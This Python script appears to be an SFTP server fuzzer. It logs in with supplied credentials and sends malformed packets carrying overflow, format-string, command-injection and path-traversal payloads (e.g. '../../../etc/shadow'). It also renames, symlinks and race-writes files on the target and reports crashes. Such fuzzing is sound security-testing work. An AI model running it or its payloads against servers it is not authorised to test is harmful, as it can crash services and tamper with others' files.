#!/usr/bin/env python3

import paramiko
import argparse
import time
import socket
import os
import random
import stat
import threading
from pwn import *

# sftp needs big endian otherwise lengths parse backwards and crash it
context.endian = 'big'

# stfu paramiko
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# protocol constants
SSH_FXP_INIT = 1
SSH_FXP_VERSION = 2
SSH_FXP_OPEN = 3
SSH_FXP_CLOSE = 4
SSH_FXP_READ = 5
SSH_FXP_WRITE = 6
SSH_FXP_OPENDIR = 11
SSH_FXP_REMOVE = 13
SSH_FXP_RENAME = 18
SSH_FXP_SYMLINK = 20
SSH_FXP_STATUS = 101
SSH_FXP_HANDLE = 104

class SFTPTube:
    def __init__(self, host, port, user, password):
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.client = None
        self.channel = None

    def connect(self):
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            self.client.connect(
                self.host, 
                port=self.port, 
                username=self.user, 
                password=self.password,
                timeout=5,
                allow_agent=False,
                look_for_keys=False
            )
            
            transport = self.client.get_transport()
            self.channel = transport.open_session()
            self.channel.settimeout(2.0)
            self.channel.invoke_subsystem("sftp")
            
            log.success(f"established raw sftp channel to {self.host}:{self.port}")
            return True
        except Exception as e:
            log.warning(f"connection failed: {e}")
            return False

    def send_raw(self, data):
        if self.channel and not self.channel.closed:
            try:
                self.channel.sendall(data)
                return True
            except socket.error:
                return False
        return False

    def recv_raw(self, size=4096):
        if self.channel and not self.channel.closed:
            try:
                return self.channel.recv(size)
            except socket.timeout:
                return b"TIMEOUT"
            except socket.error:
                return b"ERROR"
        return b""

    def close(self):
        if self.client:
            self.client.close()

# --- packet building functions ---

def build_string(data):
    if isinstance(data, str):
        data = data.encode('utf-8', errors='ignore')
    return p32(len(data)) + data

def build_packet(ptype, req_id, payload, bad_len=None):
    inner = p8(ptype) + p32(req_id) + payload
    # fake the length if we are fuzzing it
    pkt_len = p32(bad_len) if bad_len is not None else p32(len(inner))
    return pkt_len + inner

# --- payload generators ---

def get_weird_strings():
    p = [
        b"A" * 4096,                      # standard buffer overflow
        cyclic(4096),                     # pwntools cyclic pattern
        b"../../../etc/shadow",           # path traversal
        b"%s%s%s%s%n%n",                  # format string
        b"\x00" * 1024,                   # null byte injection
        b"; sleep 10 ;",                  # cmd injection
        b"\xFF\xFE\xFD\xFC",              # bad utf-8
        b"/" + b"A" * 255 + b"/test.txt"  # max path violation
    ]

    # dyn gen: buffer boundaries
    for size in [255, 256, 1023, 1024, 4095, 8191, 8192, 65535]:
        p.append(b"A" * size)
        p.append(b"\x00" * size)

    # dyn gen: deep traversal
    for depth in [10, 50, 100, 250]:
        p.append(b"../" * depth + b"etc/passwd")
        p.append(b"..\\" * depth + b"Windows\\System32\\cmd.exe")

    # dyn gen: massive format strings
    for count in [10, 50, 100]:
        p.append(b"%s" * count)
        p.append(b"%n" * count)
        p.append(b"%x.%d.%p" * count)

    # dyn gen: random binary junk
    for size in [64, 512, 2048, 8192]:
        p.append(os.urandom(size))

    return p

def get_weird_lengths():
    lengths = [
        0x00000000, # zero length
        0xFFFFFFFF, # int overflow
        0x7FFFFFFF, # signed int overflow
        10,         # truncated length
    ]
    
    lengths.extend([0xFF, 0x0100, 0xFFFF, 0x10000, 0xFFFFFF])
    
    for _ in range(5):
        lengths.append(random.randint(0, 0xFFFFFFFF))
        
    return list(set(lengths))

def get_weird_types():
    types = [
        0x00, # null type
        0xFF, # max byte
        0x7F, # boundary
        0x09, # ssh_fxp_setstat (often buggy)
    ]
    
    # fuzz random types outside normal 1-22 range
    types.extend(random.sample(range(23, 255), 15))
    return list(set(types))

# --- main fuzzer ---

class Fuzzer:
    def __init__(self, args):
        self.args = args
        self.req_id = 1
        self.target_dir = b"."
        self.existing_files = []
        self.perform_recon()
        
    def perform_recon(self):
        log.info("doing recon to find the target folder and files...")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                self.args.target, port=self.args.port, 
                username=self.args.user, password=self.args.password, 
                timeout=5, allow_agent=False, look_for_keys=False
            )
            sftp = client.open_sftp()
            
            # scan root for the first folder
            items = sftp.listdir_attr('.')
            target = None
            for item in items:
                if stat.S_ISDIR(item.st_mode) and item.filename not in ('.', '..'):
                    target = item.filename
                    break
            
            if target:
                self.target_dir = target.encode()
                log.success(f"locked onto target folder: {target}")
                
                # grab files inside it for later interaction
                sub_items = sftp.listdir_attr(target)
                self.existing_files = [i.filename.encode() for i in sub_items if not stat.S_ISDIR(i.st_mode)]
                log.success(f"found {len(self.existing_files)} files inside {target} to mess with")
            else:
                log.warning("no folders found in root. defaulting to '.'")
                
            sftp.close()
            client.close()
            
        except Exception as e:
            log.warning(f"recon failed: {e}. defaulting to '.'")

    def check_alive(self):
        try:
            with socket.create_connection((self.args.target, self.args.port), timeout=3):
                return True
        except (socket.timeout, socket.error):
            return False

    def get_tube(self, retries=5, delay=2):
        for i in range(retries):
            tube = SFTPTube(self.args.target, self.args.port, self.args.user, self.args.password)
            if tube.connect():
                if self.init_session(tube):
                    return tube
                else:
                    tube.close()
            log.warning(f"attempt {i + 1}/{retries} failed. waiting {delay}s...")
            time.sleep(delay)
        return None

    def init_session(self, tube):
        # init doesnt use a request_id so pack it raw
        payload = p32(3) 
        inner = p8(SSH_FXP_INIT) + payload
        packet = p32(len(inner)) + inner
        
        tube.send_raw(packet)
        resp = tube.recv_raw()
        
        if resp == b"TIMEOUT":
            log.warning("sftp init failed: timeout")
            return False
        elif resp in (b"ERROR", b""):
            log.warning("sftp init failed: conn dropped")
            return False
        else:
            # log.info(f"sftp init ok. handshake: {repr(resp)}")
            return True

    def run_app_fuzzing(self):
        log.info(f"starting phase 1: app layer fuzzing inside '{self.target_dir.decode()}'")
        
        for payload in get_weird_strings():
            log.info(f"testing payload: {repr(payload[:20])}...")
            
            tube = self.get_tube()
            if not tube:
                log.warning("target seems dead. skipping.")
                continue

            # drop the payload inside our target directory
            fname_bytes = self.target_dir + b"/" + payload
            fname = build_string(fname_bytes)
            pflags = p32(0x00000001) 
            attrs = p32(0) 
            
            open_data = fname + pflags + attrs
            packet = build_packet(SSH_FXP_OPEN, self.req_id, open_data)
            
            tube.send_raw(packet)
            resp = tube.recv_raw()
            
            self.analyze(packet, resp, "phase 1 - open")
            
            self.req_id += 1
            tube.close()

    def run_proto_fuzzing(self):
        log.info(f"starting phase 2a: bad lengths inside '{self.target_dir.decode()}'")
        
        for bad_len in get_weird_lengths():
            log.info(f"testing len header: {hex(bad_len)}")
            tube = self.get_tube()
            if not tube:
                continue

            fname = build_string(self.target_dir + b"/test.txt")
            open_data = fname + p32(1) + p32(0)
            packet = build_packet(SSH_FXP_OPEN, self.req_id, open_data, bad_len=bad_len)
            
            tube.send_raw(packet)
            resp = tube.recv_raw()
            
            self.analyze(packet, resp, f"phase 2a - len {hex(bad_len)}")
            self.req_id += 1
            tube.close()

        log.info("starting phase 2b: bad types")
        
        for bad_type in get_weird_types():
            log.info(f"testing type: {hex(bad_type)}")
            tube = self.get_tube()
            if not tube:
                continue

            fname = build_string(self.target_dir + b"/test.txt")
            open_data = fname + p32(1) + p32(0)
            packet = build_packet(bad_type, self.req_id, open_data)
            
            tube.send_raw(packet)
            resp = tube.recv_raw()
            
            self.analyze(packet, resp, f"phase 2b - type {hex(bad_type)}")
            self.req_id += 1
            tube.close()

    def run_interaction_fuzzing(self):
        log.info("starting phase 3: interacting with existing targets")
        
        # test interacting with the folder itself
        tube = self.get_tube()
        if tube:
            log.info(f"testing interaction on folder: {self.target_dir.decode()}")
            dname = build_string(self.target_dir)
            # try opening it with weird parameters
            packet = build_packet(SSH_FXP_OPENDIR, self.req_id, dname)
            tube.send_raw(packet)
            resp = tube.recv_raw()
            self.analyze(packet, resp, "phase 3 - opendir")
            self.req_id += 1
            tube.close()

        if not self.existing_files:
            log.warning("no files found in target dir to mess with")
            return

        for f in self.existing_files:
            log.info(f"testing interaction on file: {f.decode('utf-8')}")
            
            # test 1: open with massive garbage flags
            tube = self.get_tube()
            if not tube: continue
            fname = build_string(self.target_dir + b"/" + f)
            packet = build_packet(SSH_FXP_OPEN, self.req_id, fname + p32(0xFFFFFFFF) + p32(0))
            tube.send_raw(packet)
            resp = tube.recv_raw()
            self.analyze(packet, resp, f"phase 3 - bad open {f.decode('utf-8')}")
            self.req_id += 1
            tube.close()
            
            # test 2: rename to a massive string
            tube = self.get_tube()
            if not tube: continue
            new_fname = build_string(self.target_dir + b"/fuzzed_rename_" + b"A" * 1000)
            packet = build_packet(SSH_FXP_RENAME, self.req_id, fname + new_fname)
            tube.send_raw(packet)
            resp = tube.recv_raw()
            self.analyze(packet, resp, f"phase 3 - rename {f.decode('utf-8')}")
            self.req_id += 1
            tube.close()

            # test 3: create a symlink with a format string payload
            tube = self.get_tube()
            if not tube: continue
            link_fname = build_string(self.target_dir + b"/link_%n%n%n%n")
            packet = build_packet(SSH_FXP_SYMLINK, self.req_id, link_fname + fname)
            tube.send_raw(packet)
            resp = tube.recv_raw()
            self.analyze(packet, resp, f"phase 3 - symlink {f.decode('utf-8')}")
            self.req_id += 1
            tube.close()
            
            # test 4: try to remove it 
            #tube = self.get_tube()
            #if not tube: continue
            #packet = build_packet(SSH_FXP_REMOVE, self.req_id, fname)
            #tube.send_raw(packet)
            #resp = tube.recv_raw()
            #self.analyze(packet, resp, f"phase 3 - remove {f.decode('utf-8')}")
            #self.req_id += 1
            #tube.close()

    def run_concurrency_fuzzing(self):
        log.info("starting phase 4: parallel session & race condition fuzzing")
        tubes = []
        max_sessions = 15
        
        log.info(f"attempting to spawn {max_sessions} parallel sftp sessions...")
        for i in range(max_sessions):
            t = SFTPTube(self.args.target, self.args.port, self.args.user, self.args.password)
            if t.connect() and self.init_session(t):
                tubes.append(t)
            else:
                log.warning(f"failed to open session {i+1}")
                
        log.success(f"successfully opened {len(tubes)}/{max_sessions} concurrent sessions")
        
        if not tubes:
            log.warning("no sessions opened. skipping race condition test.")
            return

        log.info("smashing the exact same file from all sessions at the exact same microsecond...")
        
        # force all threads to wait at this barrier before sending the packet
        barrier = threading.Barrier(len(tubes))
        
        def slam_file(tube, idx):
            # open the file for writing + creating
            fname = build_string(self.target_dir + b"/race_test_shared.txt")
            
            # 0x1B (read|write|creat|trunc) 
            pflags = p32(0x0000001B)
            attrs = p32(0)
            pkt = build_packet(SSH_FXP_OPEN, self.req_id + idx, fname + pflags + attrs)
            
            # wait for everyone to be ready so it's a perfect race condition
            barrier.wait()
            
            tube.send_raw(pkt)
            resp = tube.recv_raw()
            
            if resp in (b"", b"ERROR"):
                log.warning(f"thread {idx} blocked! server forcefully dropped the connection (EOF).")
                return
            elif resp == b"TIMEOUT":
                log.warning(f"thread {idx} blocked! server timed out.")
                return

            # check if we got a handle back (type 104)
            if len(resp) > 13 and resp[4] == SSH_FXP_HANDLE:
                hlen = u32(resp[9:13])
                handle = resp[13:13+hlen]
                
                # try to write overlapping data
                h_str = p32(len(handle)) + handle
                offset = p64(0) # everyone writes to byte 0
                data = f"ALL HAIL THREAD {idx} ".encode() * 50
                d_str = p32(len(data)) + data
                
                wpkt = build_packet(SSH_FXP_WRITE, self.req_id + idx + 100, h_str + offset + d_str)
                tube.send_raw(wpkt)
                tube.recv_raw() # wait for write to finish
                
                # explicitly close the handle so the server actually saves it to disk
                cpkt = build_packet(SSH_FXP_CLOSE, self.req_id + idx + 200, h_str)
                tube.send_raw(cpkt)
                tube.recv_raw()
            else:
                # unpack the sftp status to see exactly why it failed
                if len(resp) >= 5 and resp[4] == SSH_FXP_STATUS:
                    scode = u32(resp[9:13]) if len(resp) >= 13 else "???"
                    msg = "unknown error"
                    if len(resp) >= 17:
                        msg_len = u32(resp[13:17])
                        if len(resp) >= 17 + msg_len:
                            msg = resp[17:17+msg_len].decode('utf-8', errors='ignore')
                    log.warning(f"thread {idx} blocked! status: {scode} - {msg}")
                else:
                    log.warning(f"thread {idx} blocked! unexpected resp bytes: {repr(resp[:20])}")
        
        threads = []
        for i, t in enumerate(tubes):
            th = threading.Thread(target=slam_file, args=(t, i))
            threads.append(th)
            th.start()
            
        # wait for the dust to settle
        for th in threads:
            th.join()
            
        log.success("race condition payload delivered. checking if server survived...")
        if self.check_alive():
            log.success("server is still breathing")
        else:
            log.critical(f"SERVER CRASHED during concurrent upload! port {self.args.port} is down")
            
        for t in tubes:
            t.close()

    def analyze(self, packet, resp, ctx):
        # cap logs so we dont flood the terminal on huge buffers
        sent_prev = repr(packet[:100]) + ("..." if len(packet) > 100 else "")
        log.info(f"[{ctx}] sent ({len(packet)}b): {sent_prev}")
        
        if resp == b"TIMEOUT":
            log.warning(f"[{ctx}] timeout. hang or dos?")
        elif resp in (b"ERROR", b""):
            log.warning(f"[{ctx}] conn dropped. checking liveness...")
            if self.check_alive():
                log.success(f"[{ctx}] server killed the session safely")
            else:
                log.critical(f"[{ctx}] SERVER CRASHED! port {self.args.port} is down")
        else:
            resp_prev = repr(resp[:100]) + ("..." if len(resp) > 100 else "")
            log.info(f"[{ctx}] recv ({len(resp)}b): {resp_prev}")

            # parse sftp status code if we got one
            if len(resp) >= 5:
                rtype = u8(resp[4:5])
                if rtype == SSH_FXP_STATUS:
                    status_str = "unknown code"
                    
                    if len(resp) >= 13:
                        scode = u32(resp[9:13]) 
                        
                        if len(resp) >= 17:
                            msg_len = u32(resp[13:17])
                            if len(resp) >= 17 + msg_len:
                                msg = resp[17:17+msg_len].decode('utf-8', errors='ignore')
                                status_str = f"code {scode} - {msg}"
                                
                    log.success(f"[{ctx}] server handled it. ({status_str})")
                else:
                    log.warning(f"[{ctx}] weird response type: {rtype}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-P", "--password", required=True)
    parser.add_argument("--mode", choices=['app', 'proto', 'interact', 'race', 'all'], default='all')
    
    args = parser.parse_args()
    fuzzer = Fuzzer(args)
    
    if args.mode in ['app', 'all']:
        fuzzer.run_app_fuzzing()
    if args.mode in ['proto', 'all']:
        fuzzer.run_proto_fuzzing()
    if args.mode in ['interact', 'all']:
        fuzzer.run_interaction_fuzzing()
    if args.mode in ['race', 'all']:
        fuzzer.run_concurrency_fuzzing()